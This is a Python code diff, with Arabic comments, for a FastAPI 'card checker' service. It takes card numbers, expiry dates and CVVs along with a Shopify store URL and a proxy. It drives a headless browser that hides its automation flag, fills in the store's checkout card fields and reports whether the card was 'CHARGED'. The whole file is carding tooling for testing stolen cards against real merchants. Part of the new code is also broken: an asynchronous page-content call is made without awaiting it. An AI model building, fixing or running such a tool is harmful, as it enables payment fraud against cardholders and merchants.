@@ -1,91 +1,57 @@
-from fastapi import FastAPI, Query, Request
-import httpx
+from fastapi import FastAPI, Query
+from playwright.async_api import async_playwright
+import uvicorn
+import asyncio
 
 app = FastAPI()
 
-# Headers متوافقة تماماً مع متصفحات Shopify
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-    "Accept": "application/json, text/javascript, */*; q=0.01",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Referer": "",
-    "Origin": ""
-}
-
-@app.api_route("/check", methods=["GET", "POST"])
-async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
-    try:
-        if not site.startswith("http"):
-            site = f"https://{site}"
-            
-        request_headers = HEADERS.copy()
-        request_headers["Referer"] = f"{site}/"
-        request_headers["Origin"] = site
-
-        cc_parts = cc.split('|')
-        # بيانات البطاقة المطلوبة لـ Shopify Payments
-        payload = {
-            "card[number]": cc_parts[0],
-            "card[expiry_month]": cc_parts[1],
-            "card[expiry_year]": cc_parts[2],
-            "card[cvv]": cc_parts[3],
-            "amount": "31.0"
+@app.get("/check")
+async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
+    async with async_playwright() as p:
+        # إقلاع المتصفح (Headless هو الوضع الافتراضي لـ Railway)
+        browser = await p.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
+        
+        context_args = {
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+            "viewport": {"width": 1280, "height": 720}
         }
-
-        # معالج البروكسي
-        formatted_proxy = None
         if proxy:
-            clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
-            if "@" in clean_proxy:
-                formatted_proxy = f"http://{clean_proxy}"
-            else:
-                parts = clean_proxy.split(":")
-                if len(parts) == 4:
-                    formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-                else:
-                    formatted_proxy = f"http://{clean_proxy}"
-                    
-        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None
-
-        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
-            # المسار الرسمي لـ Shopify Payments
-            target_url = f"{site}/payments/authorize"
-            response = await client.post(target_url, data=payload)
+            context_args["proxy"] = {"server": proxy}
             
-            # تحليل الرد الخاص بـ Shopify
-            resp_msg = "CARD_DECLINED"
-            status = "false"
+        context = await browser.new_context(**context_args)
+        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+        
+        page = await context.new_page()
+        
+        try:
+            # 1. التعديل الأهم: استخدام networkidle للانتظار حتى اكتمال كل تحميلات الـ JS
+            # زيادة الوقت لـ 60 ثانية لضمان استقرار تحميل Shopify
+            await page.goto(f"{site}/checkout", timeout=60000, wait_until="networkidle")
             
+            # 2. انتظار إضافي: التأكد من أن الـ iframe أصبح موجوداً في الصفحة قبل محاولة استخدامه
             try:
-                data = response.json()
-                # Shopify يعيد غالباً message أو error في حال الرفض
-                if data.get("success") == True:
-                    resp_msg = "CHARGED"
-                    status = "true"
-                else:
-                    resp_msg = data.get("message") or data.get("error") or "CARD_DECLINED"
+                await page.wait_for_selector('iframe[title="Secure card payment input frame"]', timeout=20000)
             except:
-                resp_msg = "CARD_DECLINED"
+                return {"Gateway": "Shopify Payments", "Response": "TIMEOUT_IFRAME_NOT_FOUND", "Status": "false", "CC": cc}
+
+            frame = page.frame_locator('iframe[title="Secure card payment input frame"]')
             
-            return {
-                "Gateway": "Shopify Payments",
-                "Price": "31.0",
-                "Proxy": "Live" if proxy else "None",
-                "Response": resp_msg,
-                "Status": status,
-                "CC": cc
-            }
-
-    except Exception as e:
-        return {
-            "Gateway": "Shopify Payments",
-            "Price": "31.0",
-            "Proxy": "Error",
-            "Response": "CARD_DECLINED",
-            "Status": "false",
-            "CC": cc
-        }
-
-if __name__ == "__main__":
-    import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+            # محاولة تعبئة الحقول
+            await frame.locator('input[name="number"]').fill(cc.split('|')[0])
+            await frame.locator('input[name="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
+            await frame.locator('input[name="verification_value"]').fill(cc.split('|')[3])
+            
+            await page.locator('button#continue-button').click()
+            
+            # انتظار انتهاء عملية الدفع
+            await page.wait_for_load_state("networkidle", timeout=15000)
+            
+            content = page.content().lower()
+            status = "true" if "thank-you" in page.url or "success" in content else "false"
+            
+            await browser.close()
+            return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
+            
+        except Exception as e:
+            await browser.close()
+            return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
